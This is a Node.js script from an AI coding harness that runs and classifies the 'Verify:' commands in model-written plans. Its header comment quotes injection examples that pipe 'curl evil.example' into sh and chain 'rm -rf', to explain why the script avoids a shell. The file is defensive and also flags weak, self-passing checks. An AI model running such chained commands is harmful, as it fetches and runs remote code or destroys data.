#!/usr/bin/env node
// Runs the `**Verify:**` command attached to each step of a plan and reports pass/fail per step.
//
//   node .claude/harness/verify-plan.mjs <plan.md>            run every check
//   node .claude/harness/verify-plan.mjs <plan.md> --lint      classify without executing anything
//   node .claude/harness/verify-plan.mjs <plan.md> --strict    exit 2 if the plan cannot prove anything
//   node .claude/harness/verify-plan.mjs <plan.md> --json      machine-readable
//
// This is what turns an auditor from a second opinion into a reader of exit codes. A step carrying an
// executable check can be PROVEN done; one carrying only prose can only be judged.
//
// Exit codes:  0 every step passed · 1 a step failed · 2 the plan's checks cannot discriminate
//
// Exit 2 is distinct from exit 1 on purpose. "There is work to do" and "this plan cannot tell you
// whether work was done" are different facts, and only the second one means the plan itself is broken.
//
// ── THERE IS NO SHELL ──────────────────────────────────────────────────────────
//
// The most important line in this file is `execFileSync`, not `execSync`.
//
// A plan is a document a model wrote. Running its strings through a shell makes this checker an
// execution vector — which is exactly what a naive version becomes. With start-anchored patterns and a
// shell, all of these execute:
//
//     grep -q x y ; curl evil.example | sh
//     npm run typecheck && rm -rf <anything>
//
// The first attempt at a fix anchored the patterns and then refused shell metacharacters by regex. It
// worked, and it immediately refused five legitimate commands — `grep -c "Dto = {"`,
// `grep -n "export const map\b"` — each a metacharacter sitting harmlessly inside a quoted argument.
// Patching that a third time would have been the wrong lesson.
//
// `execFileSync(file, args)` uses no shell. Parsing each Verify line into argv and executing it
// directly makes `;`, `&&`, `|`, backticks and `$()` inert literal arguments BY CONSTRUCTION.
// `grep -q x y ; curl evil | sh` becomes grep with four odd arguments and fails harmlessly. Nothing
// has to RECOGNISE an attack, so nothing can fail to.
//
// The allowlist stays as defence in depth: it bounds WHICH programs may run, while the absence of a
// shell bounds what those programs can be made to do.

import { execFileSync } from 'node:child_process'
import { readFileSync } from 'node:fs'

import { load } from './config.mjs'

// ── argv parsing ───────────────────────────────────────────────────────────────
//
// Unwraps each quoted span in place, so `foo"bar baz"` is one argument.
//
// THE UNESCAPE RULE IS POSIX, NOT "REMOVE BACKSLASHES". Inside double quotes a backslash is special
// only before `$`, a backtick, `"`, or another backslash; everywhere else it is a literal character.
// A naive `\\(.)` -> `$1` turns the grep pattern `"export const map\b"` into `export const mapb`,
// silently changing what a check MEANS — a word-boundary anchor becomes a stray letter, and the check
// still runs and still reports a result.
//
// Single quotes take no escapes at all.
const unescapeDoubleQuoted = text => text.replace(/\\([$`"\\])/g, '$1')

export const toArgv = command =>
  (command.match(/(?:[^\s"']+|"(?:\\.|[^"\\])*"|'[^']*')+/g) ?? []).map(token =>
    token.replace(/"((?:\\.|[^"\\])*)"|'([^']*)'/g, (_, double, single) =>
      double === undefined ? single : unescapeDoubleQuoted(double)
    )
  )

// ── Check SHAPE, not just check RESULT ─────────────────────────────────────────
//
// A `grep -q "<token>" <file>` where the step is what PUTS `<token>` in `<file>` passes the instant the
// text is typed. It proves authorship, not behaviour.
//
// Measured on one real integration plan: 16 checks, of which 11 were this shape, 3 were `test -f`, and
// 2 could actually fail. One step reported PASS while a third of it was never delivered, because its
// grep matched a string the other two-thirds had introduced.
//
// Classified and reported, never silently rejected — some steps genuinely cannot be proven by a command
// (a deletion, a wording change), and blocking those pushes the author to write a FAKE check instead of
// an honest `unverifiable`, which is strictly worse.
export const shapeOf = command => {
  if (!command) return 'none'
  if (/^\s*test\s+-[fde]\s/.test(command)) return 'exists'
  if (/^\s*grep\s/.test(command)) return 'self'

  return 'real'
}

export const isDiscriminating = shape => shape === 'real'

// ── Parsing ────────────────────────────────────────────────────────────────────
//
// Fenced blocks are stripped BEFORE parsing. A plan quoting a template, or showing a diff of another
// plan, would otherwise have those example headings parsed as real steps — and a ghost step with no
// check drags its whole phase to needs-human, or worse, one with a check gets EXECUTED.
//
// `unterminated` is returned rather than swallowed. An unterminated fence is the failure mode with no
// symptom: every line after it is blanked, so the steps below simply stop existing and the plan reports
// a smaller, entirely green step count. Silently verifying half a document is worse than refusing to
// verify it.
export const stripFences = markdown => {
  let inFence = false

  const text = markdown
    .split('\n')
    .map(line => {
      if (line.trimStart().startsWith('```')) {
        inFence = !inFence

        return ''
      }

      return inFence ? '' : line
    })
    .join('\n')

  return { text, unterminated: inFence }
}

const STEP_PATTERN = /^#### (Step [\d.]+): (.+)$/gm

export const parseSteps = markdown => {
  // Match AND slice from the SAME string. Matching on stripped text and slicing from the original puts
  // every offset out by the length of the removed fences, so each `**Verify:**` line is read from the
  // wrong region — and a plan silently becomes "mostly unverifiable".
  const { text: source, unterminated } = stripFences(markdown)
  const matches = [...source.matchAll(STEP_PATTERN)]
  const steps = []

  matches.forEach((match, index) => {
    const start = match.index
    const end = index + 1 < matches.length ? matches[index + 1].index : source.length
    const body = source.slice(start, end)
    const verify = body.match(/^\*\*Verify:\*\*\s*`(.+?)`\s*$/m)

    steps.push({ id: match[1], title: match[2].trim(), command: verify ? verify[1].trim() : null })
  })

  steps.unterminatedFence = unterminated

  return steps
}

export const phaseOf = step => step.id.split(' ')[1]?.split('.')[0]

// ── Duplicate checks ───────────────────────────────────────────────────────────
//
// Two steps in one phase carrying the IDENTICAL Verify command is a false-PASS generator that survives
// every other guard here: the command is allowed, discriminating, runs, and passes honestly. The defect
// is that it is not a check of THIS step. One command cannot prove two different steps, so the second is
// unproven whatever it returns.
//
// WITHIN A PHASE ONLY, and that boundary is the design. Comparing across the whole document immediately
// condemns the correct and deliberate idiom of closing every phase with the same gate — and flagging
// that would push authors to invent distinct-looking checks to satisfy the linter.
//
// Two identical checks in ONE phase are redundant by construction: nothing can happen between them that
// changes the answer. The same command at the end of two different phases runs against two different
// trees and is a real, if coarse, statement about each.
export const duplicateChecks = steps => {
  const byKey = new Map()

  for (const step of steps) {
    if (!step.command) continue

    const key = `${phaseOf(step)}::${step.command}`
    const bucket = byKey.get(key) ?? { command: step.command, ids: [] }

    bucket.ids.push(step.id)
    byKey.set(key, bucket)
  }

  return [...byKey.values()].filter(entry => entry.ids.length > 1)
}

// ── Classification ─────────────────────────────────────────────────────────────
//
// Pure: takes a plan's steps and the config, returns what each step's check IS, without running
// anything. `--lint` is exactly this, and the executing path uses the same function so the two can
// never disagree about what "discriminating" means.
export const classify = (steps, config) => {
  const allowlist = config.checkAllowlist ?? []
  const unsatisfiable = config.unsatisfiableChecks ?? []

  return steps.map(step => {
    const shape = shapeOf(step.command)

    if (!step.command) return { ...step, shape, verdict: 'SKIP', why: 'no check defined' }

    const unfair = unsatisfiable.find(entry => entry.re.test(step.command))

    // "May be executed" and "is a valid gate" are different claims, and conflating them is expensive.
    // A step gated on a command that can never exit 0 fails forever against correct code — the phase
    // never completes, and the task loop eventually halts naming work that was finished.
    if (unfair) return { ...step, shape, verdict: 'BLOCK', why: `unsatisfiable check — ${unfair.why}` }

    if (!allowlist.some(pattern => pattern.test(step.command))) {
      return {
        ...step,
        shape,
        verdict: 'BLOCK',
        why: 'not on the check allowlist — add the command to `commands` or `plan.allowedChecks` in harness.config.json'
      }
    }

    return { ...step, shape, verdict: null }
  })
}

export const tally = classified => {
  const checkable = classified.filter(step => step.command && step.verdict !== 'BLOCK')
  const discriminating = checkable.filter(step => isDiscriminating(step.shape)).length

  return {
    total: classified.length,
    checkable: checkable.length,
    discriminating,
    weak: checkable.length - discriminating,
    unverifiable: classified.filter(step => !step.command).length,
    blocked: classified.filter(step => step.verdict === 'BLOCK').length
  }
}

// ── Execution ──────────────────────────────────────────────────────────────────
//
// TWO ENVIRONMENT PROBLEMS, BOTH SILENT, BOTH FOUND THE HARD WAY.
//
// 1. NODE_TEST_CONTEXT is exported by Node's test runner and inherited all the way down. A
//    `node --test` grandchild that sees it reports itself as a subtest to a parent runner that is not
//    listening — AND EXITS 0 WHETHER OR NOT ITS TESTS PASSED. So any plan step verified by
//    `node --test` reports PASS regardless of outcome whenever verify-plan is invoked from inside a
//    test, which is exactly how its own suite invokes it. A universal false green in the component
//    whose entire job is refusing false greens.
//
// 2. REENTRANCY. A step may legitimately be verified by the project's full verify command. That command
//    may run the harness selftest, which may run this file, which executes its steps, including the
//    verify command. An unbounded fork bomb from a plan containing nothing unusual. The sentinel is
//    inherited by every descendant, so the cycle is cut the second time round wherever it starts.
const REENTRY = 'CLAUDE_HARNESS_VERIFY_PLAN_ACTIVE'

const stepEnv = () => {
  const env = { ...process.env, [REENTRY]: '1' }

  delete env.NODE_TEST_CONTEXT

  return env
}

const runCheck = (command, timeout) => {
  const [file, ...args] = toArgv(command)

  if (!file) return { ok: false, why: 'empty command' }

  try {
    execFileSync(file, args, { stdio: 'pipe', encoding: 'utf8', env: stepEnv(), timeout })

    return { ok: true }
  } catch (error) {
    return { ok: false, why: `exit ${error.status ?? '?'}` }
  }
}

// ── main ───────────────────────────────────────────────────────────────────────

const main = () => {
  const planPath = process.argv[2]
  const lintOnly = process.argv.includes('--lint')
  const strict = process.argv.includes('--strict')
  const asJson = process.argv.includes('--json')

  if (!planPath) {
    console.error('usage: verify-plan.mjs <plan.md> [--lint] [--strict] [--json]')
    process.exit(2)
  }

  let markdown

  try {
    markdown = readFileSync(planPath, 'utf8')
  } catch {
    console.error(`cannot read ${planPath}`)
    process.exit(2)
  }

  const config = load()
  const steps = parseSteps(markdown)
  const classified = classify(steps, config)
  const counts = tally(classified)
  const duplicates = duplicateChecks(steps)

  // Refusing to EXECUTE rather than refusing to run at all keeps the classifier and the lint output
  // working in the nested case, which is what a caller inside the cycle actually wants.
  const reentered = process.env[REENTRY] === '1'
  const execute = !lintOnly && !reentered

  const results = classified.map(step => {
    if (step.verdict) return step
    if (!execute) return { ...step, verdict: 'SKIP', why: reentered ? 'reentrant invocation' : 'lint only' }

    const outcome = runCheck(step.command, config.verifyTimeoutMs)

    return { ...step, verdict: outcome.ok ? 'PASS' : 'FAIL', why: outcome.why }
  })

  if (asJson) {
    console.log(JSON.stringify({ planPath, steps: results, tally: counts, duplicates, unterminatedFence: steps.unterminatedFence }))
  } else {
    for (const step of results) {
      console.log(`${step.verdict.padEnd(5)} ${step.id} — ${step.title} [${step.shape}]${step.why ? `  (${step.why})` : ''}`)
    }

    console.log(
      `\nchecks: ${counts.discriminating} discriminating, ${counts.weak} weak, ` +
        `${counts.unverifiable} unverifiable, ${counts.blocked} blocked`
    )

    for (const duplicate of duplicates) {
      console.log(`WARN  ${duplicate.ids.join(' and ')} share one check — one command cannot prove two steps`)
    }

    if (steps.unterminatedFence) {
      console.log('WARN  unterminated code fence — every step after it was invisible to this run')
    }
  }

  // An unterminated fence means the step list is not the plan's step list. Nothing below it can be
  // trusted, so this escalates rather than warns.
  if (steps.unterminatedFence) process.exit(2)

  if (strict) {
    const threshold = config.plan?.strictThreshold ?? 0.5

    if (counts.checkable > 0 && counts.discriminating < counts.checkable * threshold) {
      console.log(
        `\nSTRICT: only ${counts.discriminating} of ${counts.checkable} checks can actually fail. ` +
          `This plan cannot tell you whether its work was done.\n` +
          `Rewrite the weak ones as commands that RUN something, not greps for a token the step itself types.`
      )
      process.exit(2)
    }

    if (duplicates.length) {
      console.log('\nSTRICT: duplicate checks within a phase — the second step of each pair is unproven.')
      process.exit(2)
    }
  }

  process.exit(results.some(step => step.verdict === 'FAIL' || step.verdict === 'BLOCK') ? 1 : 0)
}

if (process.argv[1]?.endsWith('verify-plan.mjs')) main()
